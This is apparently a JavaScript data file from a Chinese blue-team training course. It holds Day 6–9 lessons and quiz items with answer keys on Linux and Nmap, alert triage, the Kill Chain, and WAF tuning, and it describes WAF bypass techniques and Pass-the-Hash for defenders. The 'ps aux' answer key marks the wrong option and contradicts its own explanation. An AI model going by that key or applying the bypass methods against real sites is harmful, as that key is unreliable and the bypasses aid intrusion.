      {type:'boolean',question:'应急响应完成后就可以关闭事件，不需要做复盘。',options:['正确','错误'],correctIndex:1,explanation:'错误！PDCERF的F（Follow-up）=跟踪复盘，没有复盘就无法提升。复盘产出=改进计划+技战法更新+策略优化。'},
      // 实战
      {question:'收到一条"端口扫描"告警，核查后发现该IP的扫描行为集中在内网数据库端口（3306/1433），应如何处理？',options:['忽略，只是扫描','封禁IP并立即排查内网是否存在该漏洞','仅记录到台账','报告甲方等待指示'],correctIndex:1,explanation:'针对数据库端口的定向扫描说明攻击者有明确目标，不是盲扫。应封禁IP+排查数据库是否存在弱口令/漏洞。'},
      {type:'fill',question:'蓝队在准备阶段（PDCERF-P）应建立的通讯机制中必须包含的即时通讯工具（中国大陆常用）是微信/企业微信/___。',correctAnswer:'钉钉/飞书',explanation:'准备阶段应建立应急通讯群、确定24小时值班电话、明确上报路径和权限审批流程。'},
      {question:'SOC分析师发现一条SQL注入告警，核查后Payload确实是恶意代码，但目标系统是静态HTML网站没有数据库，应如何处置？',options:['按真实攻击启动应急','判定为无效攻击(无法利用)，降级处理并记录','直接忽略','封禁全站IP段'],correctIndex:1,explanation:'虽然Payload是恶意的，但目标系统无数据库=攻击无法生效，应降级(如P2→P3)、记录、观察，不需启动全流程应急。'},
      {type:'multiple',question:'以下哪些属于"闭环"阶段应完成的事项？（多选）',options:['确认处置措施已生效','填写事件处置报告','更新相关SOP/技战法','将事件归档纳入知识库'],correctIndices:[0,1,2,3],explanation:'闭环四件事=验证生效+填写报告+更新SOP+归档入库。处置完不闭环等于白做，下次同样问题还会重复发生。'},
      {question:'什么是"误报"（False Positive）告警？',options:['攻击被成功防御','正常行为被错误地标记为攻击','真正的攻击未被检测到','攻击者故意制造的错误告警'],correctIndex:1,explanation:'误报=FP，正常行为被报警。对应概念：漏报=FN（真实攻击未被报警）。蓝队需同时关注降低误报和减少漏报。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-6', day: 6,
    title: '值守工具（Linux命令+Nmap）',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['熟练使用15个以上Linux基础命令', '能用3种Nmap扫描参数', '会使用ps/netstat排查异常进程'],
    keyPoints: ['Linux基础命令(cd/ls/cp/mv/rm/chmod等)', 'Nmap端口扫描', 'ps/netstat进程排查', 'Wireshark抓包'],
    content: `# Day 6：值守工具（Linux命令+Nmap）

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 核心学习内容
- 视频：Nmap/Wireshark + Linux基础（ps/netstat/grep）
- 新增：明确要求熟练使用15个以上基础命令（cd/ls/cp/mv/rm/chmod等）

## 🔧 实操任务
- 用Nmap扫描本地靶机识别服务
- 用ps/netstat排查异常进程

## ✅ 验收标准
- 熟练使用15+ Linux命令
- 能用3种Nmap扫描参数`,
    quiz: [
      // Linux基础命令 (1-8)
      {question:'Linux中，哪个命令用于查看当前目录下的所有文件（包括隐藏文件）？',options:['ls','ls -a','ls -l','dir'],correctIndex:1,explanation:'ls -a 显示所有文件（含.开头的隐藏文件）。ls -l=详细列表，ls -la=显示所有文件的详细信息。'},
      {question:'Linux中修改文件权限的命令是什么？',options:['chown','chmod','chgrp','mod'],correctIndex:1,explanation:'chmod=change mode，修改文件权限(rwx)。chown修改所有者，chgrp修改所属组。'},
      {type:'fill',question:'Linux中，___命令用于查看当前工作目录的绝对路径。',correctAnswer:'pwd',explanation:'pwd=Print Working Directory，显示当前所在目录。'},
      {type:'fill',question:'Linux中，___命令用于创建新目录，___命令用于删除空目录。',correctAnswer:'mkdir/rmdir',explanation:'mkdir=Make Directory创建目录，rmdir=删除空目录。rm -rf用于递归强制删除非空目录。'},
      {question:'Linux的chmod命令中，权限755对应的含义是什么？',options:['所有人可读写','所有者rwx，组和他人r-x','所有者只读，组可读写','所有人都不可执行'],correctIndex:1,explanation:'755=rwxr-xr-x：所有者(7=rwx)可读写执行，同组用户(5=r-x)可读执行，其他用户(5=r-x)可读执行。'},
      {type:'multiple',question:'以下哪些是Linux常用文件操作命令？（多选）',options:['cp(复制)','mv(移动/重命名)','rm(删除)','touch(创建空文件)','cat(查看文件内容)'],correctIndices:[0,1,2,3,4],explanation:'以上均为基础文件操作命令，蓝队值守中高频使用。'},
      {question:'Linux中查看文件内容的前10行，应使用什么命令？',options:['tail -10','head -10','cat -10','less -10'],correctIndex:1,explanation:'head默认显示前10行。tail显示末尾10行。cat显示全部，less分页浏览。'},
      {type:'fill',question:'Linux中，___命令用于在文件中搜索匹配特定模式的行。',correctAnswer:'grep',explanation:'grep(Global Regular Expression Print)是Linux文本搜索的核心命令，支持正则表达式。'},
      // 进程/网络排查 (9-14)
      {type:'multiple',question:'以下哪些Linux命令可用于排查异常进程和网络连接？（多选）',options:['ps','netstat','ss','top'],correctIndices:[0,1,2,3],explanation:'ps查看进程，netstat/ss查看网络连接和端口，top查看实时资源占用。ss是新版socket统计工具替代netstat。'},
      {question:'Linux中ps aux命令的作用是什么？',options:['显示所有用户的进程详细信息','只显示当前用户的进程','列出所有文件','查看系统版本信息'],correctIndex:1,explanation:'ps aux=显示所有用户(a)+用户格式(u)+无终端进程(x)的完整列表，是排查异常进程的常用组合。'},
      {type:'fill',question:'Linux中___命令可以显示所有监听的TCP/UDP端口及其对应的进程PID。',correctAnswer:'netstat -tunlp',explanation:'netstat -tunlp：-t(TCP)、-u(UDP)、-n(数字格式)、-l(监听)、-p(进程)。ss -tunlp是现代的替代命令。'},
      {question:'蓝队排查可疑进程时，发现一个名为"kworker\[x/crypt]"的进程CPU占用率100%，应如何判断？',options:['肯定是被植入挖矿木马','需要进一步排查，可能是正常内核进程也可能被伪装','立即kill该进程','重启服务器'],correctIndex:1,explanation:'kworker是Linux内核工作线程，正常命名在方括号内。但攻击者会用类似名称伪装挖矿进程，需结合进程链和网络连接综合判断。'},
      {type:'boolean',question:'使用"kill -9 PID"可以优雅地终止一个进程，让进程有机会保存数据再退出。',options:['正确','错误'],correctIndex:1,explanation:'错误！kill -9 (SIGKILL)是强制立即终止，进程无法做任何清理。kill -15 (SIGTERM)才是优雅终止，允许进程自行清理。'},
      {question:'top命令中显示的Load Average三个数值代表什么？',options:['CPU温度','系统在过去1/5/15分钟的平均负载','内存使用率','磁盘IO'],correctIndex:1,explanation:'Load Average=平均负载（可运行+不可中断的进程数），三个值分别对应1/5/15分钟。过高意味着CPU/IO压力大。'},
      // Nmap (15-17)
      {question:'使用Nmap扫描目标主机的所有65535个TCP端口，应使用哪个参数？',options:['-sS','-p-','-A','-O'],correctIndex:1,explanation:'-p- 表示扫描全部端口（1-65535）。-sS=SYN半开扫描，-A=全面扫描（OS+服务+脚本），-O=操作系统检测。'},
      {question:'Nmap的-sS扫描参数（SYN半开扫描）与-sT（全连接扫描）相比，优点是什么？',options:['更准确','速度更快、痕迹更少（不完成三次握手，不产生应用日志）','不需要root权限','不受防火墙影响'],correctIndex:1,explanation:'SYN半开扫描在收到SYN+ACK后不发送ACK完成握手，直接发送RST重置。因此不留下应用层日志。但需要root权限。'},
      {type:'fill',question:'Nmap中，使用___参数可以进行服务版本探测，使用___参数可以进行操作系统指纹识别。',correctAnswer:'-sV/-O',explanation:'-sV=版本探测（连接端口后识别服务软件和版本），-O=OS检测（分析TCP/IP栈指纹判断操作系统类型）。'},
      // Wireshark (18)
      {question:'Wireshark抓包时发现大量TCP重传包（Retransmission），说明什么？',options:['网络通信正常','网络丢包或拥塞','是正常的TCP行为','攻击者在扫描'],correctIndex:1,explanation:'大量TCP重传通常意味着网络丢包、延时过高或网络拥塞。也可能是攻击者测试网络稳定性。'},
      {type:'fill',question:'Wireshark捕获过滤器中，只想抓取目标端口80的流量，语法为___。',correctAnswer:'tcp port 80',explanation:'捕获过滤器（Capture Filter）使用BPF语法：tcp port 80。区别于显示过滤器（Display Filter）的tcp.port==80。'},
      // 综合实战 (19-20)
      {question:'蓝队在日常值守中发现某内网主机ps输出中多了一个名为"/tmp/.bash"的进程，PID很高且父进程为Web服务账号，应如何处理？',options:['忽略，可能是系统更新','立即记录并上报，该特征高度符合Webshell反弹Shell的后门行为','kill进程然后下班','只查看不处理'],correctIndex:1,explanation:'/tmp下隐藏文件+与Web服务关联+非正常系统进程=Webshell后门典型特征。应立即隔离该主机，固定证据，启动应急流程。'},
      {type:'boolean',question:'在护网值守中，使用Nmap扫描攻击来源IP的开放端口属于常规蓝队操作，不会产生任何风险。',options:['正确','错误'],correctIndex:1,explanation:'错误！对攻击源IP进行Nmap扫描可能被视为反向攻击/越界行为，在护网规则中通常被禁止。蓝队应通过情报查询而非主动扫描获取信息。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-7', day: 7,
    title: '第一阶段验收考核',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['所有基础验收标准达标', '理论笔试通过（OSI/HTTP/Linux命令）', '完成设备操作考核', '完成日志分析笔试', '完成基础事件单填写'],
    keyPoints: ['OSI七层模型', 'HTTP协议', 'Linux基础命令', '设备操作', '日志分析', '事件单填写'],
    content: `# Day 7：第一阶段验收考核

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 考核内容
- 融合考核：理论笔试（含OSI/HTTP/Linux命令）+ 设备操作 + 日志分析笔试 + 基础事件单填写

## 🔧 实操任务
- 输出《薄弱点清单》
- 搭建好个人笔记库框架

## ✅ 验收标准
- 所有基础验收标准达标
- 笔记库分类完成（网络/系统/工具）`,
    quiz: [
      // 综合考核 - OSI/网络基础
      {question:'OSI七层模型中，传输层使用的主要协议是？',options:['HTTP/HTTPS','TCP/UDP','IP/ICMP','ARP/RARP'],correctIndex:1,explanation:'TCP和UDP工作在传输层（第4层），负责端到端通信。HTTP在第7层，IP在第3层，ARP在第2-3层之间。'},
      {question:'网络层（第3层）的核心协议是什么？',options:['TCP','HTTP','IP','DNS'],correctIndex:2,explanation:'IP协议工作在网络层，负责寻址和路由。TCP/UDP在传输层，HTTP/DNS在应用层。'},
      {type:'fill',question:'OSI模型第2层（数据链路层）使用___地址进行通信，第3层（网络层）使用___地址。',correctAnswer:'MAC/IP',explanation:'MAC地址(48位)用于局域网内通信，IP地址用于跨网段路由。交换机基于MAC转发，路由器基于IP转发。'},
      {type:'boolean',question:'路由器工作在OSI第3层，基于IP地址进行转发决策。',options:['正确','错误'],correctIndex:0,explanation:'正确。路由器=第3层设备，基于IP路由表转发数据包。交换机=第2层设备，基于MAC地址表转发。'},
      // HTTP协议
      {question:'HTTP状态码301和302的区别是什么？',options:['301是临时重定向，302是永久','301是永久重定向，302是临时','没有区别','301表示错误，302表示成功'],correctIndex:1,explanation:'301=永久重定向（Moved Permanently），搜索引擎会更新索引。302=临时重定向（Found），搜索引擎保留原URL。'},
      {type:'fill',question:'HTTP请求方法中，___用于获取资源，___用于提交数据并在服务器创建新资源。',correctAnswer:'GET/POST',explanation:'GET=获取资源（参数在URL中，有长度限制），POST=提交数据创建（数据在Body中，无长度限制）。'},
      {type:'boolean',question:'HTTP是无状态协议，每次请求互相独立，服务器不保留上次请求的信息。',options:['正确','错误'],correctIndex:0,explanation:'正确。HTTP本质无状态——服务器"不记得"用户之前做了什么。Cookie和Session是为此发明的工作机制。'},
      // 安全设备
      {question:'防火墙、WAF、IDS在防护体系中最合理的部署顺序是什么？',options:['防火墙→WAF→IDS→Web服务器','IDS→防火墙→WAF→Web服务器','WAF→防火墙→IDS→Web服务器','IDS→WAF→防火墙→Web服务器'],correctIndex:0,explanation:'流量路径：互联网→防火墙(L3/L4过滤)→WAF(L7 Web攻击检测)→IDS(旁路复制流量分析)→Web服务器。'},
      {type:'fill',question:'WAF（Web应用防火墙）的核心功能是实时检测并阻断___等Web攻击。',correctAnswer:'SQL注入/SQL注入和XSS',explanation:'WAF=Web专用防火墙，工作在应用层，核心防护SQL注入、XSS、CSRF、文件包含等Web攻击。'},
      {type:'multiple',question:'第一阶段应达成的能力包括哪些？（多选）',options:['识别SYN/ACK/FIN标志位','区分防火墙与WAF的作用','编写0day漏洞利用代码','分析Windows登录日志','掌握告警研判四步法'],correctIndices:[0,1,3,4],explanation:'第一阶段聚焦抓包分析、设备认知、日志分析、告警研判等基础能力。编写0day利用代码是高级渗透技能。'},
      // 日志分析
      {question:'分析Windows安全日志时，发现某个用户在凌晨3点登录（事件ID=4624），登录类型为10（远程交互），该用户平时只在工作时间办公。应如何处理？',options:['忽略','判定为高风险行为，需进一步排查是否账户被盗','直接禁用该账户','重启域控服务器'],correctIndex:1,explanation:'异常时间+异常登录类型=高风险信号，可能账户凭证已被泄露，需立即排查IP来源、登录后操作。'},
      {type:'fill',question:'Linux日志分析中，/var/log/auth.log记录大量"Failed password for root"说明可能正在遭受___攻击。',correctAnswer:'SSH暴力破解',explanation:'大量root登录失败=SSH暴力破解典型特征。应立即封禁攻击IP、检查SSH配置是否禁用了root远程登录。'},
      // 告警研判
      {question:'告警研判四步法的正确顺序是？',options:['处置→研判→核查→闭环','核查→研判→处置→闭环','研判→处置→核查→闭环','闭环→核查→处置→研判'],correctIndex:1,explanation:'标准顺序：核查(确认)→研判(定性)→处置(行动)→闭环(记录)。先确认再行动，杜绝盲动。'},
      {question:'以下哪个属于SOC值守中的"误报"（False Positive）？',options:['真实攻击被漏掉','正常业务请求被错误告警','攻击者绕过了检测规则','WAF成功阻拦了攻击'],correctIndex:1,explanation:'误报=正常行为被标记为攻击。漏报(False Negative)=真实攻击未被检测到——两者都是蓝队需要优化的指标。'},
      {type:'boolean',question:'P0级别告警（核心资产被成功攻击）需要30分钟内启动应急响应流程。',options:['正确','错误'],correctIndex:0,explanation:'正确。P0=最高级别，需立即启动PDCERF。护网中通常要求P0事件5分钟内响应、30分钟内完成初步遏制。'},
      // 综合
      {type:'multiple',question:'作为初级蓝队值守人员，以下哪些是必须具备的能力？（多选）',options:['在SIEM中看懂告警内容','独立封禁/解封IP','完成告警研判四步法全流程','独立设计企业纵深防御方案'],correctIndices:[0,1,2],explanation:'初级岗=看懂告警+基础操作+标准流程执行。设计纵深防御方案是高级岗要求。'},
      {question:'护网值守中收到一条告警：外部IP对Web服务器发起SQL注入攻击。最先应该做什么？',options:['直接封禁外部IP','核查Payload是否真的是恶意代码，目标是否存在SQL注入漏洞','上报甲方等待批复','忽略并继续监控'],correctIndex:1,explanation:'先核查再处置。确认Payload恶意性+目标系统是否可被利用，再做处置决策。盲目封禁可能封掉正常测试流量。'},
      {type:'fill',question:'蓝队值守人员的5项核心日常工作可以概括为：告警监控、___、事件处置、情报查询和日报撰写。',correctAnswer:'日志分析',explanation:'五项日常=告警监控+日志分析+事件处置+情报查询+日报撰写，循环往复构成值班节奏。'},
      {type:'boolean',question:'第一阶段（Day 1-7）学完后，可以独立处理P0-P3全级别告警的研判和处置。',options:['正确','错误'],correctIndex:1,explanation:'错误！第一阶段只能处理P2-P3低级别告警的标准化处置。P0-P1高级别事件需要在第二阶段（Day 8-14）完成后才能独立应对。'},
      {type:'fill',question:'第一阶段验收考核包含四项：理论笔试、设备操作、___笔试和基础事件单填写。',correctAnswer:'日志分析',explanation:'四项考核=理论笔试(OSI/HTTP/Linux)+设备操作+日志分析笔试+事件单填写，四者全部通过才算第一阶段达标。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  // ==================== 第二阶段：实战进阶周（Day8-Day14） ====================
  {
    id: 'hw-e28-8', day: 8,
    title: '高阶攻击链路与WAF绕过',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['输出标准攻击链路全景图', '能区分扫描类与入侵类告警', '理解WAF绕过手法', '理解内网横向移动'],
    keyPoints: ['WAF绕过实战', '内网横向移动', '扫描vs入侵告警区分', '攻击链路图绘制', '边界突破'],
    content: `# Day 8：高阶攻击链路与WAF绕过

> **阶段**：实战进阶周（初级→中级岗）

## 📚 核心学习内容
- 视频：WAF绕过实战 + 内网横向移动
- 新增：区分扫描类（探测）与入侵类（getshell）攻击特征

## 🔧 实操任务
- Vulhub测试文件上传绕过手法
- 绘制包含边界突破+横向移动的攻击链路图

## ✅ 验收标准
- 输出标准攻击链路全景图
- 能区分扫描与入侵告警`,
    quiz: [
      // 扫描 vs 入侵区分
      {question:'以下哪种行为属于"入侵类"攻击而非"扫描类"探测？',options:['Nmap端口扫描','目录爆破探测','成功上传Webshell文件','版本指纹识别'],correctIndex:2,explanation:'Webshell上传=已成功进入系统并获取控制权，属于入侵类(P0/P1)。端口扫描、目录探测、版本识别均为扫描/侦察阶段(P2/P3)。'},
      {question:'扫描类与入侵类告警最核心的区分依据是什么？',options:['告警数量','攻击来源地域','有没有"成功进入系统"的证据','告警发生时间'],correctIndex:2,explanation:'关键区分=攻击是否已成功渗透。扫描类只是"看"，入侵类已经"进去"。前者封IP+观察，后者立即启动应急。'},
      {type:'fill',question:'扫描类告警通常产生大量___状态码的响应，而入-侵类告警往往伴随___状态码的成功响应。',correctAnswer:'404/200',explanation:'目录扫描产生大量404（不存在），攻击成功产生200（成功）。但注意：200也可是正常业务，需结合其他特征综合研判。'},
      {type:'boolean',question:'扫描类告警vs入侵类告警的区分关键：扫描类流量小而探测性强，入侵类包含实际攻击载荷（payload）。',options:['正确','错误'],correctIndex:0,explanation:'正确。区分依据主要是流量中是否包含真实的攻击载荷（如SQL注入语句、木马文件等）。'},
      // Kill Chain 攻击链路
      {question:'Lockheed Martin网络杀伤链（Kill Chain）模型包含几个阶段？',options:['5','7','9','3'],correctIndex:1,explanation:'七阶段：侦察→武器化→投递→利用→安装→C2（命令与控制）→行动（目标达成）。每个阶段蓝队都有对应的检测/阻断机会。'},
      {type:'fill',question:'Kill Chain模型中，攻击者建立远程控制通道的阶段称为___（英文缩写），该阶段攻击者会设置后门与C2服务器通信。',correctAnswer:'C2',explanation:'C2=Command and Control，攻击者通过反弹Shell/DNS隧道/HTTPS通信等方式远程控制已攻陷的主机。'},
      {type:'multiple',question:'Kill Chain七阶段中，蓝队最有机会检测到的阶段有哪些？（多选）',options:['投递(Delivery)','利用(Exploitation)','安装(Installation)','C2通信','行动(Actions)'],correctIndices:[0,1,2,3,4],explanation:'除了"武器化"阶段（攻击者本地制作武器，蓝队无法检测），其余6个阶段蓝队都可通过日志/流量/告警发现。'},
      {type:'boolean',question:'Kill Chain的"武器化"（Weaponize）阶段发生在攻击者本地，蓝队几乎无法检测到。',options:['正确','错误'],correctIndex:0,explanation:'正确。武器化=攻击者在本地构造Payload/生成木马，不产生网络流量或目标系统的日志，蓝队确实无法检测。'},
      {question:'蓝队从日志中发现：①某IP反复探测Web目录→②该IP尝试上传PHP文件→③出现对/uploads/shell.php的200访问→④服务器向外发出DNS隧道流量。这对应Kill Chain的哪些阶段？',options:['仅是扫描','侦察→利用→安装→C2','DDoS攻击','正常运维操作'],correctIndex:1,explanation:'①=侦察(Recon)，②=利用(Exploit)，③=安装(Install)，④=C2。四个告警串成完整Kill Chain攻击链路。'},
      // WAF绕过
      {question:'以下哪种WAF绕过手法利用了HTTP参数污染（HPP）？',options:['大小写混写','双参数提交','Unicode编码','注释符插入'],correctIndex:1,explanation:'HTTP参数污染（HPP）利用服务器对同名参数的不同解析方式绕过WAF。如WAF检查第一个参数、服务器使用第二个参数。'},
      {question:'WAF绕过中使用"大小写混写"技术，例如 SeLeCt 替代 SELECT，利用了什么原理？',options:['WAF规则是大小写不敏感的','后端数据库SQL解析器对关键字不区分大小写，但WAF没有做大小写不敏感匹配','WAF完全无法检测大写','这只是编码问题'],correctIndex:1,explanation:'SQL解析器对SELECT/seLECT/SeLeCt都一样处理，但如果WAF规则只匹配小写SELECT，就会被绕过。现代WAF大多已支持大小写不敏感匹配。'},
      {type:'fill',question:'WAF绕过中，___编码技术将Payload中的字符转换为HTML实体或URL编码（如将\'转为%27），以规避基于字符串匹配的WAF规则。',correctAnswer:'URL',explanation:'URL编码/双重编码是常见WAF绕过手法。如\'→%27→%2527。防御WAF应在检查前先做一层解码归一化。'},
      {type:'multiple',question:'以下哪些是常见WAF绕过手法？（多选）',options:['大小写混写','URL/Unicode编码','注释符插入(/**/等)','分块传输编码','HTTP参数污染'],correctIndices:[0,1,2,3,4],explanation:'以上均为常见WAF绕过技术。分块传输(Chunked Transfer)将Payload拆分成小块传输，WAF可能无法拼合完整Payload。'},
      {type:'boolean',question:'部署了WAF就可以100%防护所有Web攻击，不需要其他安全措施。',options:['正确','错误'],correctIndex:1,explanation:'错误！WAF有绕过风险（0day/编码/协议层面绕过），且只能防护Web攻击。需配合IDS/IPS/EDR/SIEM等形成多层防御。'},
      // 内网横向移动
      {question:'攻击者在拿下Web服务器后，最常见的下一步动作是什么？',options:['立即关机','内网横向移动——探测内网其他主机并尝试渗透','格式化服务器','联系管理员'],correctIndex:1,explanation:'边界突破后的下一步=内网横向移动，目标是找到域控、数据库等核心资产。常用的横向手法有Pass-the-Hash、WMI、RDP等。'},
      {type:'fill',question:'攻击者在内网横向移动时，常使用___技术在不需要明文密码的情况下，利用NTLM哈希直接认证远程主机。',correctAnswer:'Pass-the-Hash/PTH',explanation:'Pass-the-Hash(PTH)=利用Windows NTLM认证的缺陷，用哈希值代替明文密码进行远程认证，是内网横向最常用的技术。'},
      // 实战综合
      {question:'蓝队发现某外部IP在10分钟内对80个不同URL路径发起探测请求，返回大量404，这个行为应如何定性？',options:['正常用户访问','目录扫描/探测','DDoS攻击','SQL注入尝试'],correctIndex:1,explanation:'短时间内大量不同路径+大量404=典型的目录扫描行为。属于侦察阶段（P3），应封禁IP并关注是否有后续攻击。'},
      {type:'fill',question:'绘制完整攻击链路图时，至少应包含以下环节：信息收集→___→权限提升→___→数据窃取。',correctAnswer:'边界突破/横向移动',explanation:'标准攻击链路=信息收集→边界突破→权限提升→横向移动→数据窃取。每个环节标注关键检测点和处置方式。'},
      {type:'boolean',question:'内网横向移动中，RDP（远程桌面）是最隐蔽的方式，因为RDP是正常运维行为不容易被检测。',options:['正确','错误'],correctIndex:1,explanation:'错误！RDP连接会在Windows安全日志中产生明确的登录事件（4624，登录类型10），且远程IP可溯源。相比之下WMI、DCOM等更隐蔽。'},
      {question:'以下哪个是检测内网横向移动最有效的日志源？',options:['应用错误日志','Windows安全事件日志(事件ID 4624/4625/4672)','DHCP日志','DNS查询日志'],correctIndex:1,explanation:'Windows安全日志完整记录了所有登录事件(4624/4625)和权限提升(4672)，是检测横向移动最核心的日志源。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-9', day: 9,
    title: '设备策略调优与规则优化',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['掌握WAF误报排查方法论', '能独立添加临时防护规则', '理解误报排查逻辑（业务绕过vs真实攻击）'],
    keyPoints: ['WAF自定义规则', 'NGAF策略优化', '误报排查指南', '规则白名单', '策略收敛'],
    content: `# Day 9：设备策略调优与规则优化

> **阶段**：实战进阶周（初级→中级岗）

## 📚 核心学习内容
- 视频：WAF自定义规则 + NGAF策略优化
- 新增：误报排查逻辑（业务绕过vs真实攻击）
- 文档：误报排查指南

## 🔧 实操任务
- 模拟业务正常请求被误封场景
- 完成规则白名单添加与临时策略下发

## ✅ 验收标准
- 掌握WAF误报排查方法论
- 能独立添加临时防护规则`,
    quiz: [
      // WAF误报排查
      {question:'排查WAF误报时，第一步应该做什么？',options:['直接加白名单','确认该请求是否为正常业务行为','关闭触发规则','重启WAF设备'],correctIndex:1,explanation:'误报排查第一步=确认是否为正常业务请求。先确认再决策，避免将真实攻击误加白名单。'},
      {question:'以下哪种情况最可能是WAF误报而非真实攻击？',options:['来自办公网段的请求触发了SQL注入规则，原因是表单中包含"select"关键字','凌晨3点来自境外IP的SQL注入Payload','User-Agent为sqlmap的扫描请求','短时间内大量不同IP发起同一攻击'],correctIndex:0,explanation:'办公网段+表单中包含SQL关键字（如"select"搜索）=典型误报场景。业务表单可能包含看起来像SQL关键字的正常输入。'},
      {type:'fill',question:'WAF中用于为特定URL或参数排除检测规则的机制，称为___名单。',correctAnswer:'白',explanation:'白名单用于将已确认安全的请求路径或参数排除在检测规则之外，减少误报。但需严格审计白名单范围以防安全漏洞。'},
      {type:'multiple',question:'WAF误报排查中，以下哪些步骤是正确的？（多选）',options:['确认请求业务合理性','检查Payload是否在业务场景中有合法用途','确认来源IP是否可信','确认是否仅特定参数触发'],correctIndices:[0,1,2,3],explanation:'以上四项均为误报排查正确步骤。核心=区分"规则触发"和"真实攻击"，综合来源+Payload+业务场景判断。'},
      {type:'boolean',question:'WAF误报排查时，可以直接将触发规则的源IP加入白名单。',options:['正确','错误'],correctIndex:1,explanation:'错误！按IP加白是非常危险的做法，攻击者可能伪造或控制该IP。应优先按URL路径+参数+Payload特征精确加白。'},
      // WAF规则与策略
      {question:'WAF中"黑名单"和"白名单"哪种模式更安全但部署难度更大？',options:['黑名单','白名单','两者一样','看情况'],correctIndex:1,explanation:'白名单模式=只允许已定义的合法请求通过，安全性最高但需要全面梳理业务接口。黑名单=排除已知攻击，可能存在绕过。'},
      {type:'fill',question:'WAF的自定义规则通常基于___表达式匹配HTTP请求的特定字段（如URL/Header/Body）中的攻击特征。',correctAnswer:'正则',explanation:'正则表达式(Regex)是WAF自定义规则的核心语法，用于匹配攻击特征模式。如/union\s+select/i匹配SQL注入关键字。'},
      {question:'NGAF（下一代防火墙）与WAF相比，防护范围的主要区别是什么？',options:['NGAF只能防Web攻击','NGAF能防护L3-L7全层，WAF专注L7 Web应用','没有区别','WAF防护更全面'],correctIndex:1,explanation:'NGAF=下一代防火墙，从L3(IP/端口)到L7(应用识别)全覆盖，含IPS/AV/URL过滤等。WAF专门防护Web应用层攻击。'},
      // 策略收敛与优化
      {question:'护网战前"策略收敛"主要目的是什么？',options:['增加安全设备','收紧规则+清理冗余策略+最小化暴露面','关闭所有安全策略','增加更多告警规则'],correctIndex:1,explanation:'策略收敛=收窄攻击面。收紧防火墙规则（只开必要端口）、清理冗余策略、最小化暴露面，让攻击者无处下手。'},
      {type:'boolean',question:'策略优化时，应该尽可能多地添加告警规则以确保不遗漏任何攻击。',options:['正确','错误'],correctIndex:1,explanation:'错误！规则过多会导致告警风暴和误报泛滥，淹没有效告警。应追求"精准覆盖"：规则覆盖核心攻击面但误报可控。'},
      {type:'fill',question:'护网前的WAF策略优化应遵循___原则，即只开放业务实际需要的端口和访问路径。',correctAnswer:'最小权限/最小化',explanation:'最小权限原则=只开放必须的，拒绝其他一切。端口最小化只开80/443，URL白名单只放行业务接口，IP白名单只允许运维来源。'},
      {question:'护网期间WAF突然产生大量告警，其中大部分为同一规则触发不同来源的请求，最可能的原因是什么？',options:['攻击爆发','WAF规则更新触发了大量误报','互联网流量突然增大','网络故障'],correctIndex:1,explanation:'大量同类告警+不同来源=大概率是规则更新导致的误报。应先核查规则变更记录，抽样分析告警Payload是否为正常业务。'},
      {type:'multiple',question:'以下哪些是合理的WAF策略调优手段？（多选）',options:['对已确认安全的业务API路径添加白名单','收紧通用规则阈值减少噪声','根据业务特征定制正则规则','关闭所有检测规则减少误报'],correctIndices:[0,1,2],explanation:'白名单+阈值收紧+定制规则=调优三件套。直接关闭所有检测规则=拔掉WAF插头，这不是调优是放弃防御。'},
      // 误报 vs 真实攻击
      {type:'fill',question:'在告警研判中，区分"误报(False Positive)"和"漏报(False Negative)"：___是指正常行为被误判为攻击，___是指真实攻击未被检测到。',correctAnswer:'FP/FN',explanation:'FP(误报)=正常行为被报警→浪费时间。FN(漏报)=真实攻击未报警→安全风险。两者需要平衡，无法同时做到零FP和零FN。'},
      {question:'业务方反馈某个URL在WAF日志中频繁被拦截，但这是正常的业务操作。蓝队应该怎么处理？',options:['忽略业务方反馈','分析确认后，为该URL路径+特定参数添加白名单','直接拔掉WAF','让业务方自行修改请求'],correctIndex:1,explanation:'处理流程：确认业务合理性→分析规则匹配点→精确加白（URL路径+参数+特征）而非笼统加白→记录变更→定期复审白名单。'},
      {type:'boolean',question:'WAF规则调优后应进行回归测试，确保新规则不会误杀正常业务也不放过已知攻击。',options:['正确','错误'],correctIndex:0,explanation:'正确。任何规则变更都应通过测试验证（正常业务采样+已知攻击Payload采样），确保变更不会产生不良影响。'},
      // 实战
      {question:'护网期间，甲方突然投诉其某个重要业务系统无法正常访问。初步排查发现是WAF拦截了大量来自民众用户的正常请求。这属于什么情况？',options:['系统故障','WAF规则误杀/大面积误报','DDoS攻击','乙方操作失误'],correctIndex:1,explanation:'大面积正常用户被拦截=WAF规则误杀。应立即紧急加白该业务接口，暂停误杀规则，排查规则触发原因后精确调整。'},
      {type:'fill',question:'在护网期间遇到紧急WAF策略调整需求，应遵循变更管理流程：提交申请→___→执行变更→验证效果→记录归档。',correctAnswer:'审批',explanation:'涉及安全设备策略的变更，哪怕是紧急情况也应有审批（可先电话/即时通讯快速审批后补流程）。变更=双刃剑，不当变更可能开安全漏洞。'},
      {question:'以下哪个做法可以最有效地减少WAF误报？',options:['增加更多检测规则','建立业务的正常请求基线，基于基线定制规则','把所有告警都归类为误报','降低WAF检测敏感度到最低'],correctIndex:1,explanation:'最佳实践=理解业务+建立基线+定制规则。WAF不是开箱即用，需要针对具体业务场景持续调优。'},
